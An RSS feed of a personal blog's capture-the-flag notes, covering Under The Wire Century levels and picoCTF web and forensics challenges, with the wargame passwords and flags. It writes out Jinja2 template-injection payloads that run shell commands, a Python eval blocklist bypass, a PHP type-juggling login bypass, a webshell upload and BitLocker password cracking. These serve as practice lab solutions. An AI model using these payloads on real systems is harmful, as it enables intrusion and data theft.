<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Home Page on Alvin Tran</title>
    <link>https://alvintran.net/</link>
    <description>Recent content in Home Page on Alvin Tran</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 11 Nov 2024 21:13:19 -0500</lastBuildDate><atom:link href="https://alvintran.net/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>UTW / Century</title>
      <link>https://alvintran.net/writeups/under-the-wire/century/</link>
      <pubDate>Tue, 01 Apr 2025 02:28:08 +0000</pubDate>
      
      <guid>https://alvintran.net/writeups/under-the-wire/century/</guid>
      <description>Commands and basically solutions to the Century wargame</description>
      <content:encoded><![CDATA[<h1 id="century">Century</h1>
<ol>
<li>Doing the Slack: century1:century1</li>
<li>$psversiontable : century2:10.0.14393.7604
<ol>
<li>$PSVersion doesn&rsquo;t work in version 1, also GetHost is not reliable (only host PS)</li>
<li>Get-Host is useful but not here</li>
</ol>
</li>
<li>Invoke-WebRequest and dir gives u everything
<ol>
<li>use lowercase</li>
<li>century3:invoke-webrequest443</li>
</ol>
</li>
<li>dir is alias for Get-ChildItem
<ol>
<li>a simple (dir).count gets vtotal</li>
<li>century4:123</li>
</ol>
</li>
<li>century5:6265
<ol>
<li>to go into folders with spaces, encapsulate path in single quotes</li>
</ol>
</li>
<li>century6: underthewire3347
<ol>
<li>(Get-CimInstance Win32_NTDomain | ?{$_.Status -eq &ldquo;OK&rdquo;}).DomainName</li>
<li><code>[System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain()</code></li>
<li>$env:USERDNSDOMAIN
<ol>
<li>also :COMPUTERNAME and :USERNAME</li>
</ol>
</li>
</ol>
</li>
<li>century7:197
<ol>
<li>same as for #4</li>
<li>use -Directory flag</li>
<li>for files, gci -File</li>
</ol>
</li>
<li>century8:7points
<ol>
<li>gci - Recurse</li>
</ol>
</li>
<li>century9:696
<ol>
<li>Get-Content .\unique.txt | Sort-Object -unique | Measure-Object -line
<ol>
<li>or type and sort as cmd&rsquo;s</li>
</ol>
</li>
</ol>
</li>
<li>century10:pierid
<ol>
<li>$file = gc Word_file.txt</li>
<li>$file.split(&rsquo; )</li>
<li>Select-Object -Index 160 or you could do [160] for 161st if u have a variable</li>
</ol>
</li>
<li>century11:windowsupdates110
<ol>
<li>Get-Service -&gt; lists all services</li>
<li>findstr / Select-String -&gt; findstr works better
<ol>
<li>findstr &ldquo;Update&rdquo;</li>
<li>service name is wuauserv</li>
</ol>
</li>
<li>Get-WmiObject win32_service is more verbsose than Get-Service
<ol>
<li>pipe into | Select Name, Description</li>
</ol>
</li>
<li>Select SPecific:
<ol>
<li>Get-WmiObject win32_service | ?{$_.NAME -like &ldquo;wuauserv&rdquo;} | Select Description | $_.Description</li>
<li>($desc).Description.split(&quot; &ldquo;) | Select-Object -Index 9,8</li>
</ol>
</li>
</ol>
</li>
<li>century12:secret_sauce
<ol>
<li>-Force with dir</li>
<li>Get-ChildItem | Get-ChildItem -Recurse -File -Hidden | Where-Object {$_.Name -ne &lsquo;desktop.ini&rsquo;}</li>
</ol>
</li>
<li>century13:i_authenticate_things
<ol>
<li>Manner of waves:</li>
<li>Get-ADComputer gets information about computer
<ol>
<li>needs -Properties Description to get desc</li>
<li>also initial run needs -Filter &ldquo;*&rdquo; to get all</li>
</ol>
</li>
<li>Alternatively:
<ol>
<li>Get-ADDomainController to get name first</li>
</ol>
</li>
</ol>
</li>
<li>cenutry14:755
<ol>
<li>How i did it:  $file = gc file -&gt; gc.split(&rdquo; &ldquo;) | Measure-Object -line</li>
<li>Measure-Object -Word exists</li>
</ol>
</li>
<li>century15:158
<ol>
<li>(Select-String -Path .\countpolos -Pattern &ldquo;polo&rdquo; -AllMatches).Matches.count)</li>
</ol>
</li>
</ol>
]]></content:encoded>
    </item>
    
    <item>
      <title>picoCTF / Web</title>
      <link>https://alvintran.net/writeups/picoctf/web/</link>
      <pubDate>Tue, 01 Apr 2025 02:16:51 +0000</pubDate>
      
      <guid>https://alvintran.net/writeups/picoctf/web/</guid>
      <description>&lt;h1 id=&#34;cookie-monster-secret-recipe&#34;&gt;Cookie Monster Secret Recipe&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;http://verbal-sleep.picoctf.net:56241/&#34;&gt;http://verbal-sleep.picoctf.net:56241/&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Logging on give hit &amp;ldquo;Check cookies&amp;rdquo;&lt;/li&gt;
&lt;li&gt;value &lt;code&gt;secrent_recipe: cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzXzZDMkZCN0YzfQ%3D%3D&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;As evident from the %3d%3d, most likely base64 encoded.&lt;/li&gt;
&lt;li&gt;Flag: picoCTF{c00k1e_m0nster_l0ves_c00kies_6C2FB7F3}&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;head-dump&#34;&gt;head-dump&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Need to find enpoint  with flag&lt;/li&gt;
&lt;li&gt;Documentation about API&lt;/li&gt;
&lt;li&gt;&amp;ldquo;browser_webshell_solvable&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;So we have a home page with 4 blog posts of
&lt;ol&gt;
&lt;li&gt;cyber&lt;/li&gt;
&lt;li&gt;nodejs/swagger ui / API documentation&lt;/li&gt;
&lt;li&gt;Logging&lt;/li&gt;
&lt;li&gt;and hacking&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;None of the #links work, except for &lt;code&gt;#API Docuemntation&lt;/code&gt;
&lt;ol&gt;
&lt;li&gt;get a Swagger docuemtnation page
&lt;ol&gt;
&lt;li&gt;heapdump gets memory&lt;/li&gt;
&lt;li&gt;You can open it in text file&lt;/li&gt;
&lt;li&gt;CTRL+F &amp;ldquo;picoCTF{&amp;rdquo;&lt;/li&gt;
&lt;li&gt;picoCTF{Pat!3nt_15_Th3_K3y_ad7ea5ae&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;n0s4n1ty-1&#34;&gt;n0s4n1ty 1&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;profile picture upload&lt;/li&gt;
&lt;li&gt;need to locate file upload area, and inside /root directory.&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;uploading file change image&lt;/li&gt;
&lt;li&gt;&amp;ldquo;Update profile&amp;rdquo; button gives &amp;ldquo;File x.jpg has be uploaded Path: uplaods.jpg&amp;rdquo;
&lt;ol&gt;
&lt;li&gt;uploaded &lt;a href=&#34;https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php&#34;&gt;webshell.php&lt;/a&gt;, find we are in /var/www/html/uploads&lt;/li&gt;
&lt;li&gt;ls /root gives us &lt;code&gt;Permission Denied&lt;/code&gt;
&lt;ol&gt;
&lt;li&gt;Check sudo?&lt;/li&gt;
&lt;li&gt;We have sudo!&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;sudo ls /root finds /root/flag,txt&lt;/li&gt;
&lt;li&gt;sudo cat /root/flag.txt&lt;/li&gt;
&lt;li&gt;picoCTF{wh47_c4n_u_d0_wPHP_d698d800}&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;ssti1&#34;&gt;SSTI1&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;announcer&lt;/li&gt;
&lt;li&gt;Whatever submitted in input box is then redirected to a page with jsut that text&lt;/li&gt;
&lt;li&gt;ca use &lt;code&gt;&amp;lt;script&amp;gt; alert(5)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;what can we do then&amp;hellip;&lt;/li&gt;
&lt;li&gt;post / with content redirects to /announce&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;Try PHP innject
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;?php echo &amp;quot;test&amp;quot; ?&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;It gets automatically commented out -&amp;gt; &lt;code&gt;&amp;lt;?php&lt;/code&gt; tunrs into &lt;code&gt;&amp;lt;!---?php&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;In the HTML, we can see a POST request get sent to /&lt;/li&gt;
&lt;li&gt;Lets open burpsuite&lt;/li&gt;
&lt;li&gt;Be stupid and lookup what SSTI means
&lt;ol&gt;
&lt;li&gt;Server Side Template injection&lt;/li&gt;
&lt;li&gt;Using {{}} we can evaluate the command&lt;/li&gt;
&lt;li&gt;{{7*7}} gives up 49 instead of the output!&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection&#34;&gt;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;We find it is a Jinja2 injection&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{ request.application.__globals__.__builtins__.__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;ls&amp;#39;).read() }}
{{request.application.__globals__.__builtins__.__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;cat flag&amp;#39;).read()}}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;websockfish&#34;&gt;WebSockFish&lt;/h1&gt;
&lt;p&gt;stockfish chessbot!&lt;/p&gt;</description>
      <content:encoded><![CDATA[<h1 id="cookie-monster-secret-recipe">Cookie Monster Secret Recipe</h1>
<p><a href="http://verbal-sleep.picoctf.net:56241/">http://verbal-sleep.picoctf.net:56241/</a></p>
<ol>
<li>Logging on give hit &ldquo;Check cookies&rdquo;</li>
<li>value <code>secrent_recipe: cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzXzZDMkZCN0YzfQ%3D%3D</code></li>
<li>As evident from the %3d%3d, most likely base64 encoded.</li>
<li>Flag: picoCTF{c00k1e_m0nster_l0ves_c00kies_6C2FB7F3}</li>
</ol>
<h1 id="head-dump">head-dump</h1>
<ul>
<li>Need to find enpoint  with flag</li>
<li>Documentation about API</li>
<li>&ldquo;browser_webshell_solvable&rdquo;</li>
</ul>
<ol>
<li>So we have a home page with 4 blog posts of
<ol>
<li>cyber</li>
<li>nodejs/swagger ui / API documentation</li>
<li>Logging</li>
<li>and hacking</li>
</ol>
</li>
<li>None of the #links work, except for <code>#API Docuemntation</code>
<ol>
<li>get a Swagger docuemtnation page
<ol>
<li>heapdump gets memory</li>
<li>You can open it in text file</li>
<li>CTRL+F &ldquo;picoCTF{&rdquo;</li>
<li>picoCTF{Pat!3nt_15_Th3_K3y_ad7ea5ae</li>
</ol>
</li>
</ol>
</li>
</ol>
<h1 id="n0s4n1ty-1">n0s4n1ty 1</h1>
<ul>
<li>profile picture upload</li>
<li>need to locate file upload area, and inside /root directory.</li>
</ul>
<ol>
<li>uploading file change image</li>
<li>&ldquo;Update profile&rdquo; button gives &ldquo;File x.jpg has be uploaded Path: uplaods.jpg&rdquo;
<ol>
<li>uploaded <a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php">webshell.php</a>, find we are in /var/www/html/uploads</li>
<li>ls /root gives us <code>Permission Denied</code>
<ol>
<li>Check sudo?</li>
<li>We have sudo!</li>
</ol>
</li>
<li>sudo ls /root finds /root/flag,txt</li>
<li>sudo cat /root/flag.txt</li>
<li>picoCTF{wh47_c4n_u_d0_wPHP_d698d800}</li>
</ol>
</li>
</ol>
<h1 id="ssti1">SSTI1</h1>
<ul>
<li>announcer</li>
<li>Whatever submitted in input box is then redirected to a page with jsut that text</li>
<li>ca use <code>&lt;script&gt; alert(5)&lt;/script&gt;</code></li>
<li>what can we do then&hellip;</li>
<li>post / with content redirects to /announce</li>
</ul>
<ol>
<li>Try PHP innject
<ol>
<li><code>&lt;?php echo &quot;test&quot; ?&gt;</code></li>
<li>It gets automatically commented out -&gt; <code>&lt;?php</code> tunrs into <code>&lt;!---?php</code></li>
</ol>
</li>
<li>In the HTML, we can see a POST request get sent to /</li>
<li>Lets open burpsuite</li>
<li>Be stupid and lookup what SSTI means
<ol>
<li>Server Side Template injection</li>
<li>Using {{}} we can evaluate the command</li>
<li>{{7*7}} gives up 49 instead of the output!</li>
</ol>
</li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a>
<ol>
<li>We find it is a Jinja2 injection</li>
</ol>
</li>
</ol>
<pre tabindex="0"><code>{{ request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls&#39;).read() }}
{{request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;cat flag&#39;).read()}}
</code></pre><h1 id="websockfish">WebSockFish</h1>
<p>stockfish chessbot!</p>
<ol>
<li>In the script, we can see how the game is ran and how out fish chat messages are sent</li>
<li>The chess/chessboard/stockfish .js files are pretty standard open source stuff</li>
<li>We look at the websock, which gives uses:
<ol>
<li>sendMessage() to send data to websocket</li>
<li>and appropiate updateMEssage() our fish dialog</li>
</ol>
</li>
<li>On the bottom, we see that the scripts use this on the stockfish.onmessage() event
<ol>
<li>sf.postMEssage() evaluates the chess engine to get a response</li>
<li>then, depending on the response, we either perform the best move OR send a message to the websocket
<ol>
<li>The two messages are &ldquo;mate x&rdquo; and &ldquo;eval x&rdquo;</li>
<li>&ldquo;mate x&rdquo; looks like how soon the fish kills you</li>
<li>&ldquo;eval x&rdquo; determines the position&hellip; i.e &ldquo;i&rsquo;m winning&rdquo; or &ldquo;i&rsquo;m losing&rdquo; or &ldquo;its even&rdquo;</li>
</ol>
</li>
</ol>
</li>
<li>If you sendMessage(&ldquo;eval -9999&rdquo;) we get our flag&quot;</li>
</ol>
<h1 id="3vl">3v@l</h1>
<p>Under the hood, there is an eval function from python
figure out how to execute bad code!</p>
<ol>
<li>tried import os -&gt; there are banlist words</li>
<li>even &ldquo;os&rdquo; as a string doesn&rsquo;t work</li>
<li>I&rsquo;m stupid and its in an html comment</li>
</ol>
<pre tabindex="0"><code>    TODO
    ------------
    Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r&#39;0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.&#39;
</code></pre><p>we can instead use the <code>__import__()</code> function to get the libraries we need. We can sue them using strings. Normally, you&rsquo;d need to put <code>import os</code>, where os is a keyterm. not we can do <code>__import__(&quot;o&quot; + &quot;s&quot;)</code>, then add <code>.listdir()</code> to see our directory</p>
<p>we also have access to t he <code>open().read()</code> functions. We can read the flask file with:
<code>open('app' + '.' + &quot;py&quot;).read()</code></p>
<p>Note: we can&rsquo;t put t&quot;.&quot; with another letter as it will yell at us</p>
<p><strong>import</strong>(&ldquo;o&rdquo; + &ldquo;s&rdquo;).listdir(&quot;/flag.txt&quot;)
<strong>import</strong>(&ldquo;o&rdquo; + &ldquo;s&rdquo;).listdir(&quot;~&quot;)
<strong>import</strong>(&ldquo;o&rdquo; + &ldquo;s&rdquo;).listdir(<strong>import</strong>(&ldquo;o&rdquo; + &ldquo;s&rdquo;).sep)
<strong>import</strong>(&ldquo;o&rdquo; + &ldquo;s&rdquo;).listdir(<strong>import</strong>(&ldquo;o&rdquo; + &ldquo;s&rdquo;).path.abspath(&quot;.&quot;+ &ldquo;.&rdquo;) + &ldquo;flag&rdquo; + &ldquo;.&rdquo; + &ldquo;txt&rdquo;)
open(<strong>import</strong>(&ldquo;o&rdquo; + &ldquo;s&rdquo;).path.abspath(&quot;.&quot;+ &ldquo;.&rdquo;) + &ldquo;flag&rdquo; + &ldquo;.&rdquo; + &ldquo;txt&rdquo;).read()</p>
<h1 id="ssti2">SSTI2</h1>
<p>Same set up</p>
<ul>
<li>some tests</li>
<li><code>{{ xxxx }}</code> still works</li>
<li>function give server error</li>
<li>{{ 1.1 }} shows 11, which means . is removed.</li>
<li>() still work, but not within {} -&gt; seems to be stripped?
<ul>
<li>except () together works. only ( breaks</li>
</ul>
</li>
<li>__ are stripped</li>
<li>{{ config }} gets outputs</li>
<li>periodds are removed, so are []</li>
<li><a href="https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html#common-bypasses">https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html#common-bypasses</a></li>
</ul>
<pre tabindex="0"><code>{%with a=request|attr(&#34;application&#34;)|attr(&#34;\x5f\x5fglobals\x5f\x5f&#34;)|attr(&#34;\x5f\x5fgetitem\x5f\x5f&#34;)(&#34;\x5f\x5fbuiltins\x5f\x5f&#34;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;cat flag${IFS}&#39;)|attr(&#39;read&#39;)()%}{%print(a)%}{%endwith%}
</code></pre><h1 id="apriti-sesame-street">apriti sesame street</h1>
<p><a href="https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4">https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4</a></p>
<ul>
<li>hint says backup files from emacs</li>
<li>emacs saves edited files as <code>filename.txt~</code>
<ul>
<li>we can tehn find the logic of the hpp in <code>impossibleLogin.php</code></li>
</ul>
</li>
<li>refer to link above</li>
<li>payload is <code>username[]=a&amp;pwd[]=b</code> in body
<ul>
<li>[] turns the value into an array, which sha1 tries to cast into a string and then returns 0.
Intersting notes:</li>
</ul>
</li>
<li>php == is vulenrable to a lot of things</li>
<li>md5 collisions when doing (md5) == (md5) sisnces strings starting with 0e are treated as 0.</li>
<li>you can also type juggle strcmp
<a href="https://rst.hashnode.dev/bypassing-php-strcmp">https://rst.hashnode.dev/bypassing-php-strcmp</a></li>
</ul>
<h1 id="pachinko">Pachinko</h1>
<ul>
<li>I actually have 0 clue what i did but i connected 8-4-7.</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>picoCTF / General</title>
      <link>https://alvintran.net/writeups/picoctf/general/</link>
      <pubDate>Tue, 01 Apr 2025 02:16:46 +0000</pubDate>
      
      <guid>https://alvintran.net/writeups/picoctf/general/</guid>
      <description>&lt;h1 id=&#34;chalkboard&#34;&gt;chalkboard&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;grep -v &amp;ldquo;I WILL NOT BE SNEAKY&amp;rdquo;&lt;/li&gt;
&lt;li&gt;In&lt;strong&gt;b&lt;/strong&gt;vert matching, finds lines that do not have this full content&lt;/li&gt;
&lt;li&gt;We can assemble the flag from that&lt;/li&gt;
&lt;li&gt;picoCTF{chalkboard_bert_7c69b78b}&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;cryptography&#34;&gt;Cryptography&lt;/h1&gt;
&lt;h2 id=&#34;rsa&#34;&gt;RSA&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;For n, n is made up of p*q where p and q are supposedly large primes&lt;/li&gt;
&lt;li&gt;notice the even number for n&amp;hellip; only even prime is 2 (any other prime is odd, and odd*odd = odd).&lt;/li&gt;
&lt;li&gt;that manes p*q = N, one of pq must be 2&lt;/li&gt;
&lt;li&gt;you can get decryption key this way&lt;/li&gt;
&lt;li&gt;Code decryption in python&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;guess-my-chesse-part-1&#34;&gt;GUess my Chesse part 1&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;affine cihper&lt;/li&gt;
&lt;li&gt;each iteration of NC gives different a b values for afffine cipher&lt;/li&gt;
&lt;li&gt;encrypt 2 cheeses, check for which a b value with auto bruteforcer on &lt;a href=&#34;https://www.dcode.fr/affine-cipher&#34;&gt;dcode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;decrypt message with a b&lt;/li&gt;
&lt;/ul&gt;</description>
      <content:encoded><![CDATA[<h1 id="chalkboard">chalkboard</h1>
<ul>
<li>grep -v &ldquo;I WILL NOT BE SNEAKY&rdquo;</li>
<li>In<strong>b</strong>vert matching, finds lines that do not have this full content</li>
<li>We can assemble the flag from that</li>
<li>picoCTF{chalkboard_bert_7c69b78b}</li>
</ul>
<h1 id="cryptography">Cryptography</h1>
<h2 id="rsa">RSA</h2>
<ul>
<li>For n, n is made up of p*q where p and q are supposedly large primes</li>
<li>notice the even number for n&hellip; only even prime is 2 (any other prime is odd, and odd*odd = odd).</li>
<li>that manes p*q = N, one of pq must be 2</li>
<li>you can get decryption key this way</li>
<li>Code decryption in python</li>
</ul>
<h2 id="guess-my-chesse-part-1">GUess my Chesse part 1</h2>
<ul>
<li>affine cihper</li>
<li>each iteration of NC gives different a b values for afffine cipher</li>
<li>encrypt 2 cheeses, check for which a b value with auto bruteforcer on <a href="https://www.dcode.fr/affine-cipher">dcode</a></li>
<li>decrypt message with a b</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>picoCTF / Forensics</title>
      <link>https://alvintran.net/writeups/picoctf/forensics/</link>
      <pubDate>Tue, 01 Apr 2025 02:16:42 +0000</pubDate>
      
      <guid>https://alvintran.net/writeups/picoctf/forensics/</guid>
      <description>&lt;h1 id=&#34;ph4nt0m-1ntrud3r&#34;&gt;Ph4nt0m 1ntrud3r&lt;/h1&gt;
&lt;p&gt;pcpap capture
first, sort by time (obviously out of order)
ones of len 12 on bottom are base64 encoded -&amp;gt; get flag after copying and conveerting all TCP payloads&lt;/p&gt;
&lt;h1 id=&#34;red&#34;&gt;Red&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;supposedly normal red.png&lt;/li&gt;
&lt;li&gt;do strings files&lt;/li&gt;
&lt;li&gt;Get a poem
&lt;ul&gt;
&lt;li&gt;Notice the first letters spell &amp;ldquo;CHECK LSB&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Go to &lt;a href=&#34;https://georgeom.net/StegOnline/upload&#34;&gt;https://georgeom.net/StegOnline/upload&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;Hit the &amp;ldquo;Extract Files/Data&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Per lsb, grab bit 0 (least significant bit) of all 4 channels&lt;/li&gt;
&lt;li&gt;YOu&amp;rsquo;ll find repeated base64 values to decode&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;flags-are-stepic&#34;&gt;Flags are Stepic&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Hint says to find non-matching flag&lt;/li&gt;
&lt;li&gt;We have a University listed as one of the countries
&lt;ul&gt;
&lt;li&gt;you can grab the json data from source if u want and compare names&lt;/li&gt;
&lt;li&gt;Note: the flag abreviations are actually accurate&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;You find university at the bottom
&lt;ul&gt;
&lt;li&gt;You can&amp;rsquo;t download it directorly&lt;/li&gt;
&lt;li&gt;BUT you can go into  Inspect -&amp;gt; Application -&amp;gt; Frames -&amp;gt; Image and download it there&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/1049451037/stepic&#34;&gt;https://github.com/1049451037/stepic&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;get flag&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;bitlocker-1&#34;&gt;Bitlocker-1&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Given a .dd file (disk duplicate or whatever)&lt;/li&gt;
&lt;li&gt;bitlocker2john &lt;code&gt;filename.dd&lt;/code&gt;
&lt;ol&gt;
&lt;li&gt;Will provide 4 passwords, one is user password one is recovery key, and copies of both. Extract one of them (userpassword is first one and is necessary enough)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;use john or hashcat to crack with rockyou.txt
&lt;ol&gt;
&lt;li&gt;password is jacqueline&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;on linux, install dislocker
&lt;ol&gt;
&lt;li&gt;sudo dislocker -v -V .dd &amp;ndash;user-password=pass /media/bitlocker -&amp;gt; will create a dislocker-file inside&lt;/li&gt;
&lt;li&gt;to mount, mount -o loop,ro /media/bitlcoker/disclocker-file /mnt/wherever&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Flag is in first directory.&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;event-viewing&#34;&gt;Event Viewing&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;ctrl+f&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;bitlocker-2&#34;&gt;Bitlocker-2&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;We have a RAM .mem dump -&amp;gt; volatility
&lt;ol&gt;
&lt;li&gt;We look for bitlocker related volatility tools&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/breppo/Volatility-BitLocker&#34;&gt;https://github.com/breppo/Volatility-BitLocker&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;-&amp;gt; allows for dislocker integration&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;need volatility 2 not 3&lt;/li&gt;
&lt;li&gt;volatility needs to have a profile (ie OS),
&lt;ol&gt;
&lt;li&gt;imageinfo plugin&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;python2 vol.py -f .mem bitlocker &amp;ndash;profile={profleAbove} &amp;ndash;dislocker&lt;/li&gt;
&lt;li&gt;You&amp;rsquo;ll get .fvek files to use with dislocker, which you can refer to Bitlocker-1 for how to decode and mount file
&lt;ol&gt;
&lt;li&gt;insteadd of &amp;ndash;user-password, use &amp;ndash;kvek=&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Flag is stored in first level of mount
5b6ff64e4a0ee8f89050b7ba532f6256
60be5ce2a190dfb760bea1ece40e4223c8982aecfd03221a5a43d8fdd302eaee
1ed2a4b8dd0290f646ded074fbcff8bd
bccaf1d4ea09e91f976bf94569761654&lt;/li&gt;
&lt;/ol&gt;</description>
      <content:encoded><![CDATA[<h1 id="ph4nt0m-1ntrud3r">Ph4nt0m 1ntrud3r</h1>
<p>pcpap capture
first, sort by time (obviously out of order)
ones of len 12 on bottom are base64 encoded -&gt; get flag after copying and conveerting all TCP payloads</p>
<h1 id="red">Red</h1>
<ul>
<li>supposedly normal red.png</li>
<li>do strings files</li>
<li>Get a poem
<ul>
<li>Notice the first letters spell &ldquo;CHECK LSB&rdquo;</li>
</ul>
</li>
<li>Go to <a href="https://georgeom.net/StegOnline/upload">https://georgeom.net/StegOnline/upload</a>
<ul>
<li>Hit the &ldquo;Extract Files/Data&rdquo;</li>
</ul>
</li>
<li>Per lsb, grab bit 0 (least significant bit) of all 4 channels</li>
<li>YOu&rsquo;ll find repeated base64 values to decode</li>
</ul>
<h1 id="flags-are-stepic">Flags are Stepic</h1>
<ul>
<li>Hint says to find non-matching flag</li>
<li>We have a University listed as one of the countries
<ul>
<li>you can grab the json data from source if u want and compare names</li>
<li>Note: the flag abreviations are actually accurate</li>
</ul>
</li>
<li>You find university at the bottom
<ul>
<li>You can&rsquo;t download it directorly</li>
<li>BUT you can go into  Inspect -&gt; Application -&gt; Frames -&gt; Image and download it there</li>
</ul>
</li>
<li><a href="https://github.com/1049451037/stepic">https://github.com/1049451037/stepic</a>
<ul>
<li>get flag</li>
</ul>
</li>
</ul>
<h1 id="bitlocker-1">Bitlocker-1</h1>
<ol>
<li>Given a .dd file (disk duplicate or whatever)</li>
<li>bitlocker2john <code>filename.dd</code>
<ol>
<li>Will provide 4 passwords, one is user password one is recovery key, and copies of both. Extract one of them (userpassword is first one and is necessary enough)</li>
</ol>
</li>
<li>use john or hashcat to crack with rockyou.txt
<ol>
<li>password is jacqueline</li>
</ol>
</li>
<li>on linux, install dislocker
<ol>
<li>sudo dislocker -v -V .dd &ndash;user-password=pass /media/bitlocker -&gt; will create a dislocker-file inside</li>
<li>to mount, mount -o loop,ro /media/bitlcoker/disclocker-file /mnt/wherever</li>
</ol>
</li>
<li>Flag is in first directory.</li>
</ol>
<h1 id="event-viewing">Event Viewing</h1>
<ul>
<li>ctrl+f</li>
</ul>
<h1 id="bitlocker-2">Bitlocker-2</h1>
<ol>
<li>We have a RAM .mem dump -&gt; volatility
<ol>
<li>We look for bitlocker related volatility tools</li>
<li><a href="https://github.com/breppo/Volatility-BitLocker">https://github.com/breppo/Volatility-BitLocker</a></li>
<li>-&gt; allows for dislocker integration</li>
</ol>
</li>
<li>need volatility 2 not 3</li>
<li>volatility needs to have a profile (ie OS),
<ol>
<li>imageinfo plugin</li>
</ol>
</li>
